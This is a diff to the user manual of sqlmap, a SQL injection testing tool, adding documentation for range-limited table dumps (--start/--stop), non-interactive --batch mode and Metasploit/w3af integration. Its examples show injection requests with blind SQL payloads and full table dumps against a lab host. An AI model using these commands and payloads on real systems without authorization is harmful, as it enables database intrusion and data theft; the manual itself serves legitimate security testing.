@@ -207,8 +207,8 @@ those that vary the HTTP response page content.
 On the dynamic ones sqlmap automatically tests and detects the ones
 affected by SQL injection. Each dynamic parameter is tested for
 <em>numeric</em>, <em>single quoted string</em>, <em>double quoted
-string</em> and all of these three datatypes with zero, one and two
-parenthesis to correctly detect which is the <tt>SELECT</tt> statement syntax to
+string</em> and all of these three datatypes with zero to two parenthesis
+to correctly detect which is the <tt>SELECT</tt> statement syntax to
 perform further injections with. It is also possible to specify the
 parameter(s) that you want to perform tests and use for injection on.
 <item>Option to specify the <bf>maximum number of concurrent HTTP
@@ -239,6 +239,9 @@ and <bf>resume the injection from this file in a second time</bf>.
 <item>Support to read options from a configuration INI file rather than
 specify each time all of the options on the command line. Support also to
 save command line options on a configuration INI file.
+<item>Integration with other IT security related open source projects,
+<htmlurl url="http://metasploit.com/framework/" name="Metasploit"> and <htmlurl
+url="http://w3af.sourceforge.net/" name="w3af">.
 <item><bf>PHP setting <tt>magic_quotes_gpc</tt> bypass</bf> by encoding
 every query string, between single quotes, with <tt>CHAR</tt>, or similar,
 database management system function.
@@ -254,19 +257,19 @@ name="SourceForge File List page">.
 It is available in various formats:
 
 <itemize>
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.1.tar.gz"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.tar.gz"
 name="Source gzip compressed"> operating system independent.
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.1.tar.bz2"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.tar.bz2"
 name="Source bzip2 compressed"> operating system independent.
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.1.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.zip"
 name="Source zip compressed"> operating system independent.
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.6.1.1-1_all.deb"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.6.1-1_all.deb"
 name="DEB binary package"> architecture independent for Debian and any
 other Debian derivated GNU/Linux distribution.
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.1-1.noarch.rpm"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1-1.noarch.rpm"
 name="RPM binary package"> architecture independent for Fedora and any
 other operating system that can install RPM packages.
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1.1_exe.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.6.1_exe.zip"
 name="Portable executable for Windows"> that <bf>does not require the Python
 interpreter</bf> to be installed on the operating system.
 </itemize>
@@ -294,7 +297,7 @@ and <htmlurl url="mailto:daniele.bellucci@gmail.com" name="Daniele Bellucci">.
 <tscreen><verb>
 $ python sqlmap.py -h
 
-    sqlmap/0.6.1.1 coded by Bernardo Damele A. G. <bernardo.damele@gmail.com>
+    sqlmap/0.6.1 coded by Bernardo Damele A. G. <bernardo.damele@gmail.com>
                         and Daniele Bellucci <daniele.bellucci@gmail.com>
     
 Usage: sqlmap.py [options] {-u <URL> | -g <google dork> | -c <config file>}
@@ -342,13 +345,16 @@ Options:
     --dbs               Enumerate DBMS databases
     --tables            Enumerate DBMS database tables (opt: -D)
     --columns           Enumerate DBMS database table columns (req: -T, -D)
-    --dump              Dump DBMS database table entries (req: -T, -D opt: -C)
+    --dump              Dump DBMS database table entries (req: -T, -D opt: -C,
+                        --start, --stop)
     --dump-all          Dump all DBMS databases tables entries
     -D DB               DBMS database to enumerate
     -T TBL              DBMS database table to enumerate
     -C COL              DBMS database table column to enumerate
     -U USER             DBMS user to enumerate
     --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    --start=LIMITSTART  First table entry to dump
+    --stop=LIMITSTOP    Last table entry to dump
     --sql-query=QUERY   SQL SELECT query to be executed
     --sql-shell         Prompt for an interactive SQL shell
 
@@ -380,6 +386,7 @@ Options:
     -s SESSIONFILE      Save and resume all data retrieved on a session file
     -c CONFIGFILE       Load options from a configuration INI file
     --save              Save options on a configuration INI file
+    --batch             Never ask for user input, use the default behaviour
 </verb></tscreen>
 
 
@@ -486,7 +493,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:28] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.1.1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:29] [INFO] testing MySQL
@@ -495,7 +502,7 @@ Connection: close
 GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2852%29%2C%20
 CHAR%2852%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%207994=7994&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.1.1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.1 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -511,7 +518,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:32] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.1.1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:32] [TRAFFIC IN] HTTP response (OK - 200):
@@ -529,7 +536,7 @@ Content-Type: text/html
 GET /sqlmap/mysql/get_int.php?id=1%20AND%20ORD%28MID%28%28CONCAT%28CHAR%2852%29%2C%20
 CHAR%2852%29%29%29%2C%201%2C%201%29%29%20%3E%2063%20AND%204435=4435&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.1.1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:33] [TRAFFIC IN] HTTP response (OK - 200):
@@ -554,7 +561,7 @@ $ python sqlmap.py -u http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat
 [hh:mm:23] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int.php?id=1&amp;cat=2 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.6.1.1 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.6.1 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:23] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1977,7 +1984,8 @@ is connected to, which is always <tt>public</tt>.
 <sect2>Dump database tables entries
 
 <p>
-Options: <tt>--dump</tt>, <tt>-C</tt>, <tt>-T</tt> and <tt>-D</tt>
+Options: <tt>--dump</tt>, <tt>-C</tt>, <tt>-T</tt>, <tt>-D</tt>,
+<tt>--start</tt> and <tt>--stop</tt>
 
 <p>
 It is possible to dump the entries for a specific database table.
@@ -1994,15 +2002,15 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;ca
 Database: test
 Table: users
 [5 entries]
-+----+--------------------------------------------+-------------------+
-| id | name                                       | surname           |
-+----+--------------------------------------------+-------------------+
-| 1  | luther                                     | blissett          |
-| 2  | fluffy                                     | bunny             |
-| 3  | wu                                         | ming              |
++----+----------------------------------------------+-------------------+
+| id | name                                         | surname           |
++----+----------------------------------------------+-------------------+
+| 1  | luther                                       | blissett          |
+| 2  | fluffy                                       | bunny             |
+| 3  | wu                                           | ming              |
 | 4  | sqlmap/0.6.1 (http://sqlmap.sourceforge.net) | user agent header |
-| 5  | NULL                                       | nameisnull        |
-+----+--------------------------------------------+-------------------+
+| 5  | NULL                                         | nameisnull        |
++----+----------------------------------------------+-------------------+
 </verb></tscreen>
 
 <p>
@@ -2046,15 +2054,15 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1&amp;ca
 Database: public
 Table: users
 [5 entries]
-+----+--------------------------------------------+-------------------+
-| id | name                                       | surname           |
-+----+--------------------------------------------+-------------------+
-| 1  | luther                                     | blissett          |
-| 2  | fluffy                                     | bunny             |
-| 3  | wu                                         | ming              |
++----+----------------------------------------------+-------------------+
+| id | name                                         | surname           |
++----+----------------------------------------------+-------------------+
+| 1  | luther                                       | blissett          |
+| 2  | fluffy                                       | bunny             |
+| 3  | wu                                           | ming              |
 | 4  | sqlmap/0.6.1 (http://sqlmap.sourceforge.net) | user agent header |
-| 5  |                                            | nameisnull        |
-+----+--------------------------------------------+-------------------+
+| 5  |                                              | nameisnull        |
++----+----------------------------------------------+-------------------+
 
 [hh:mm:59] [INFO] Table 'public.users' dumped to CSV file '/software/sqlmap/output/
 192.168.1.121/dump/public/users.csv'
@@ -2069,6 +2077,39 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 "4","sqlmap/0.6.1 (http://sqlmap.sourceforge.net)","user agent header"
 "5","","nameisnull"
 </verb></tscreen>
+
+<p>
+You can also provide the <tt>--start</tt> and/or the <tt>--stop</tt> option
+to limit the dump to a range of entries.
+
+<itemize>
+<item><tt>--start</tt> specifies the first entry to enumerate
+<item><tt>--stop</tt> specifies the last entry to enumerate
+</itemize>
+
+<p>
+Example on a <bf>MySQL 5.0.51</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;cat=2" --dump \
+  -T users -D test --start 2 --stop 4
+
+Database: test
+Table: users
+[3 entries]
++----+----------------------------------------------+-------------------+
+| id | name                                         | surname           |
++----+----------------------------------------------+-------------------+
+| 2  | fluffy                                       | bunny             |
+| 3  | wu                                           | ming              |
+| 4  | sqlmap/0.6.1 (http://sqlmap.sourceforge.net) | user agent header |
++----+----------------------------------------------+-------------------+
+</verb></tscreen>
+
+<p>
+As you can see, sqlmap is very flexible: you can leave it automatically
+enumerate the whole database table up to a single column of a specific
+table entry.
 
 
 <sect2>Dump all databases tables entries
@@ -2087,15 +2128,15 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1&amp;ca
 Database: test
 Table: users
 [5 entries]
-+----+--------------------------------------------+-------------------+
-| id | name                                       | surname           |
-+----+--------------------------------------------+-------------------+
-| 1  | luther                                     | blissett          |
-| 2  | fluffy                                     | bunny             |
-| 3  | wu                                         | ming              |
++----+----------------------------------------------+-------------------+
+| id | name                                         | surname           |
++----+----------------------------------------------+-------------------+
+| 1  | luther                                       | blissett          |
+| 2  | fluffy                                       | bunny             |
+| 3  | wu                                           | ming              |
 | 4  | sqlmap/0.6.1 (http://sqlmap.sourceforge.net) | user agent header |
-| 5  | NULL                                       | nameisnull        |
-+----+--------------------------------------------+-------------------+
+| 5  | NULL                                         | nameisnull        |
++----+----------------------------------------------+-------------------+
 
 Database: information_schema
 Table: CHARACTER_SETS
@@ -2179,15 +2220,15 @@ Table: spt_datatype_info_ext
 Database: master
 Table: users
 [5 entries]
-+----+--------------------------------------------+-------------------+
-| id | name                                       | surname           |
-+----+--------------------------------------------+-------------------+
++----+----------------------------------------------+-------------------+
+| id | name                                         | surname           |
++----+----------------------------------------------+-------------------+
 | 4  | sqlmap/0.6.1 (http://sqlmap.sourceforge.net) | user agent header |
-| 2  | fluffy                                     | bunny             |
-| 1  | luther                                     | blisset           |
-| 3  | wu                                         | ming              |
-| 5  | NULL                                       | nameisnull        |
-+----+--------------------------------------------+-------------------+
+| 2  | fluffy                                       | bunny             |
+| 1  | luther                                       | blisset           |
+| 3  | wu                                           | ming              |
+| 5  | NULL                                         | nameisnull        |
++----+----------------------------------------------+-------------------+
 
 [...]
 </verb></tscreen>
@@ -3039,6 +3080,8 @@ back-end DBMS:  MySQL >= 5.0.0
 Option: <tt>--save</tt>
 
 <p>
+It is possible to save the command line options to a configuration INI
+file.
 
 <p>
 Example on a <bf>PostgreSQL 8.2.7</bf> target:
@@ -3138,6 +3181,54 @@ back-end DBMS:	PostgreSQL
 banner:    'PostgreSQL 8.2.7 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 
 4.2.3-2ubuntu4)'
 </verb></tscreen>
+
+
+<sect2>Act in non-interactive mode
+
+<p>
+Option: <tt>--batch</tt>
+
+<p>
+If you want sqlmap to run as a batch tool, without interacting with you in
+case of a choice has to be done, you can force it by using <tt>--batch</tt>
+option than letting sqlmap go for a default behaviour.
+
+<p>
+Example on a <bf>MySQL 5.0.51</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_str.php?id=1&amp;name=luther" -v 1 \
+  --batch
+
+[hh:mm:22] [INFO] testing if GET parameter 'id' is dynamic
+[hh:mm:22] [INFO] confirming that GET parameter 'id' is dynamic
+[hh:mm:22] [INFO] GET parameter 'id' is dynamic
+[hh:mm:22] [INFO] testing sql injection on GET parameter 'id' with 0 parenthesis
+[hh:mm:22] [INFO] testing unescaped numeric injection on GET parameter 'id'
+[hh:mm:22] [INFO] confirming unescaped numeric injection on GET parameter 'id'
+[hh:mm:22] [INFO] GET parameter 'id' is unescaped numeric injectable with 0 parenthesis
+[hh:mm:22] [INFO] testing if GET parameter 'name' is dynamic
+[hh:mm:22] [INFO] confirming that GET parameter 'name' is dynamic
+[hh:mm:22] [INFO] GET parameter 'name' is dynamic
+[hh:mm:22] [INFO] testing sql injection on GET parameter 'name' with 0 parenthesis
+[hh:mm:22] [INFO] testing unescaped numeric injection on GET parameter 'name'
+[hh:mm:22] [INFO] GET parameter 'name' is not unescaped numeric injectable
+[hh:mm:22] [INFO] testing single quoted string injection on GET parameter 'name'
+[hh:mm:22] [INFO] confirming single quoted string injection on GET parameter 'name'
+[hh:mm:22] [INFO] GET parameter 'name' is single quoted string injectable with 0 parenthesis
+[hh:mm:22] [INFO] there were multiple injection points, please select the one to use to go ahead:
+[0] place: GET, parameter: id, type: numeric (default)
+[1] place: GET, parameter: name, type: stringsingle
+[q] Quit
+Choice: 0
+[hh:mm:22] [DEBUG] used the default behaviour, running in batch mode
+[...]
+back-end DBMS:	MySQL >= 5.0.0
+</verb></tscreen>
+
+<p>
+As you can see, sqlmap choosed automatically to injection on the first
+vulnerable parameter which is the default behaviour.
 
 
 <sect>Disclaimer
